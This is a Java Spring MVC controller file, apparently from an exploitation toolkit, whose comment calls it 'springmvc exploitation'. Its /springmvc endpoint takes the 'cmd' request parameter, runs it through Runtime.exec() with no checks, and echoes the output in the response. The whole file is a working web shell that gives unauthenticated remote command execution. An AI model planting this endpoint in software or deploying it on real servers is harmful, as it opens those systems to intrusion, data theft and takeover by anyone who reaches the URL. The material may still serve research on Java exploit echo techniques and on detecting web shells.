package com.firebasky.echo.controller;

import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.BufferedReader;
import java.io.InputStreamReader;

/**
 * springmvc 利用
 */
@RestController
public class springmvc {
    @RequestMapping("/springmvc")
    public void springmvc()throws Exception {
        HttpServletRequest request =((ServletRequestAttributes) RequestContextHolder.getRequestAttributes()).getRequest();
        HttpServletResponse response = ((ServletRequestAttributes) RequestContextHolder.getRequestAttributes()).getResponse();
        String resHeader=request.getParameter ( "cmd" );
        java.io.InputStream in = java.lang.Runtime.getRuntime().exec(resHeader).getInputStream();
        BufferedReader br = null;
        br = new BufferedReader (new InputStreamReader(in, "GBK"));
        String line;
        StringBuilder sb = new StringBuilder();
        while ((line = br.readLine()) != null) {
            sb.append(line);
            sb.append("\n");
        }
        java.io.PrintWriter out = new java.io.PrintWriter(response.getOutputStream());
        out.write(sb.toString ());
        out.flush();
        out.close();
    }
}
